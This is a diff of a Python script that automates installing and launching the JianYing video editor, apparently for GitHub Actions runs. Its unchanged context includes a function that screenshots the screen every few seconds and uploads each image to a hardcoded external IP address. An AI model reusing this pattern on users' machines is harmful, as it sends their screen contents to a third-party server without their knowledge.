@@ -13,9 +13,11 @@ def install_jianYing():
     '''
         Down and install Jianying
     '''
-    prepare_env.DownloadJianYing()
+    #prepare_env.DownloadJianYing()
     Api.Logic_warp.echo("JianYing Downloaded.")
     Api.Logic_warp._install_JianYing("jy.exe")
+    _a = Api.Jy_Warp.Instance(Start_Jy=True)
+    
 
 def took_screenshot(lap:float=2.0):
     '''Took Screen shot Every lap'''
@@ -27,6 +29,7 @@ def took_screenshot(lap:float=2.0):
         pyautogui.screenshot(f"./outputs/screenshots/{_i}.jpg")
         requests.post("http://47.242.231.19:8002/upload_image",files={"file":open(f"./outputs/screenshots/{_i}.jpg", 'rb')})
         time.sleep(lap)
+
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument('-m','--mode',default="local",help='Working mode. [ Ga | local ]. Default is local, Ga(Github Actions) Will install essentials | 在Github Actions 模式下请选择')
@@ -43,7 +46,7 @@ if __name__ == "__main__":
     # 安装剪映
 
     Api.Logic_warp.echo("Installing JianYing.")
-    if (args.install_jianying == True) or ("Install_JianYing" in Config["Basic"] and Config["Basic"]["Install_JianYing"]==True) or (args.mode == "Ga"): install_jianYing()
+    if (args.install_jianying == True) or ("Install_JianYing" in Config["Basic"] and Config["Basic"]["Install_JianYing"]==True) or (args.mode == "Ga"):  install_jianYing()
     if os.path.exists(Api.Logic_warp._Get_JianYing_Default_Path()) == False:
         assert ("JianYing_Path" in Config["Basic"]) or os.path.exists(Config["Basic"].get("JianYing_Path")) == True , FileNotFoundError("Cannot Found Jianying Paath | 无法在默认目录中找到剪映文件")
 
